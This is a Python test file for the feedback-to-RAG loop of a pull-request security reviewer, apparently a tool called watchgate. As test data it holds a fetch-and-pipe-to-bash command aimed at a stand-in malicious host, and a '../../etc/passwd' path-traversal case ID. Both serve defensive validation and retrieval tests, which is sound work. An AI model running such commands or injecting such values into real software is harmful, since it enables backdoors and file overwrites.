"""Tests de watchgate/core/rag/feedback.py: bucle de feedback humano -> RAG."""

from __future__ import annotations

from pathlib import Path

import pytest

from watchgate.core.rag.feedback import add_confirmed_case
from watchgate.core.rag.indexer import build_index
from watchgate.core.rag.retriever import retrieve_relevant_context


def test_add_confirmed_case_persists_markdown_and_is_retrievable(tmp_path):
    index_path = str(tmp_path / "rag_index")
    feedback_dir = str(tmp_path / "feedback")

    added = add_confirmed_case(
        case_id="pr-42",
        title="PKGBUILD con curl | bash en post_install",
        narrative="Un mantenedor confirmó que este PR intentaba instalar un backdoor.",
        verdict="true_positive",
        index_path=index_path,
        feedback_dir=feedback_dir,
    )
    assert added > 0
    assert (Path(feedback_dir) / "pr-42.md").exists()

    fragments = retrieve_relevant_context(
        "post_install curl http://malicious.example | bash", k=1, index_path=index_path
    )
    assert len(fragments) == 1
    assert fragments[0].origin == "feedback"
    assert fragments[0].verdict == "true_positive"
    assert "PKGBUILD" in fragments[0].case_name


def test_add_confirmed_case_does_not_touch_existing_static_corpus(tmp_path):
    """El feedback vive en su propia colección (feedback_cases): añadir un
    caso no debe tocar ni un fragmento de la colección del corpus público."""
    index_path = str(tmp_path / "rag_index")
    corpus_count = build_index(index_path=index_path)
    assert corpus_count > 0

    add_confirmed_case(
        case_id="pr-7",
        title="Caso benigno confirmado",
        narrative="Renombrado de variable sin efectos colaterales, revisado y aprobado.",
        verdict="false_positive",
        index_path=index_path,
        feedback_dir=str(tmp_path / "feedback"),
    )

    import chromadb

    from watchgate.core.rag.indexer import COLLECTION_NAME, FEEDBACK_COLLECTION_NAME

    client = chromadb.PersistentClient(path=index_path)
    corpus_collection = client.get_collection(COLLECTION_NAME)
    assert corpus_collection.count() == corpus_count  # ni un fragmento de más

    feedback_collection = client.get_collection(FEEDBACK_COLLECTION_NAME)
    assert feedback_collection.count() > 0  # el feedback vive aparte


def test_add_confirmed_case_updating_same_case_id_drops_stale_fragments(tmp_path):
    index_path = str(tmp_path / "rag_index")
    feedback_dir = str(tmp_path / "feedback")

    first = add_confirmed_case(
        case_id="pr-99",
        title="Caso largo",
        narrative="frase larga de relleno. " * 200,
        verdict="true_positive",
        index_path=index_path,
        feedback_dir=feedback_dir,
    )
    assert first > 1

    second = add_confirmed_case(
        case_id="pr-99",
        title="Caso corto tras revisión",
        narrative="frase corta.",
        verdict="false_positive",
        index_path=index_path,
        feedback_dir=feedback_dir,
    )
    assert second == 1

    import chromadb

    from watchgate.core.rag.indexer import FEEDBACK_COLLECTION_NAME

    collection = chromadb.PersistentClient(path=index_path).get_collection(
        FEEDBACK_COLLECTION_NAME
    )
    remaining = collection.get(where={"case_id": "pr-99"})
    assert len(remaining["ids"]) == 1


def test_add_confirmed_case_rejects_path_traversal_in_case_id(tmp_path):
    """case_id se usa tal cual como nombre de fichero; sin validar, un valor
    como '../../etc/passwd' escribiría fuera de feedback_dir."""
    feedback_dir = tmp_path / "feedback"

    with pytest.raises(ValueError, match="case_id inválido"):
        add_confirmed_case(
            case_id="../../etc/passwd",
            title="x",
            narrative="x",
            verdict="true_positive",
            index_path=str(tmp_path / "rag_index"),
            feedback_dir=str(feedback_dir),
        )

    assert not (tmp_path / "etc" / "passwd.md").exists()
    assert not (tmp_path.parent / "etc" / "passwd.md").exists()


def test_feedback_gets_a_guaranteed_slot_alongside_full_corpus_results(tmp_path):
    """El feedback no compite por hueco con el corpus público: con k=3 del
    corpus (todos ocupados) más 1 de feedback, deben salir los 4 -- ninguno
    desplaza al otro porque son colecciones separadas."""
    index_path = str(tmp_path / "rag_index")
    corpus_count = build_index(index_path=index_path)
    assert corpus_count >= 3

    add_confirmed_case(
        case_id="pr-guaranteed",
        title="Caso propio confirmado",
        narrative="Un caso de feedback muy específico del propio historial de revisión.",
        verdict="true_positive",
        index_path=index_path,
        feedback_dir=str(tmp_path / "feedback"),
    )

    fragments = retrieve_relevant_context(
        "cualquier diff genérico sin relación obvia con nada en particular",
        k=3,
        index_path=index_path,
    )

    assert len(fragments) == 4  # 3 del corpus + 1 de feedback garantizado
    assert sum(1 for f in fragments if f.origin == "feedback") == 1
    assert sum(1 for f in fragments if f.origin == "corpus") == 3


def test_feedback_is_isolated_by_org_id_in_distributed_rag(tmp_path):
    """Caso real encontrado en revisión: en modo RAG distribuido
    (`WATCHGATE_CHROMA_URL` apuntando a un Chroma compartido entre
    despliegues), `feedback_cases` es una única colección compartida --
    sin filtrar por `org_id`, el feedback de un tenant se colaría en la
    recuperación de otro. El corpus público, en cambio, es intencionalmente
    compartido y NUNCA debe filtrarse."""
    index_path = str(tmp_path / "rag_index")
    feedback_dir = str(tmp_path / "feedback")
    narrative = "Un mantenedor confirmó que este PR intentaba instalar un backdoor via curl|bash."

    add_confirmed_case(
        case_id="pr-org-a",
        title="Caso confirmado de la Org A",
        narrative=narrative,
        verdict="true_positive",
        index_path=index_path,
        feedback_dir=feedback_dir,
        org_id="org-a",
    )
    add_confirmed_case(
        case_id="pr-org-b",
        title="Caso confirmado de la Org B",
        narrative=narrative,
        verdict="true_positive",
        index_path=index_path,
        feedback_dir=feedback_dir,
        org_id="org-b",
    )

    fragments_a = retrieve_relevant_context(narrative, k=0, index_path=index_path, org_id="org-a")
    assert all(f.case_name != "Caso confirmado de la Org B" for f in fragments_a)
    assert any(f.case_name == "Caso confirmado de la Org A" for f in fragments_a)

    fragments_b = retrieve_relevant_context(narrative, k=0, index_path=index_path, org_id="org-b")
    assert all(f.case_name != "Caso confirmado de la Org A" for f in fragments_b)
    assert any(f.case_name == "Caso confirmado de la Org B" for f in fragments_b)

    # Sin org_id (uso de un solo tenant, el caso original), no se filtra --
    # se ve el feedback que haya, sin más.
    fragments_unscoped = retrieve_relevant_context(
        narrative, k=0, feedback_k=2, index_path=index_path
    )
    seen_names = {f.case_name for f in fragments_unscoped}
    assert "Caso confirmado de la Org A" in seen_names
    assert "Caso confirmado de la Org B" in seen_names


def test_add_confirmed_case_rejects_case_id_with_path_separator(tmp_path):
    with pytest.raises(ValueError, match="case_id inválido"):
        add_confirmed_case(
            case_id="pr/42",
            title="x",
            narrative="x",
            verdict="true_positive",
            index_path=str(tmp_path / "rag_index"),
            feedback_dir=str(tmp_path / "feedback"),
        )
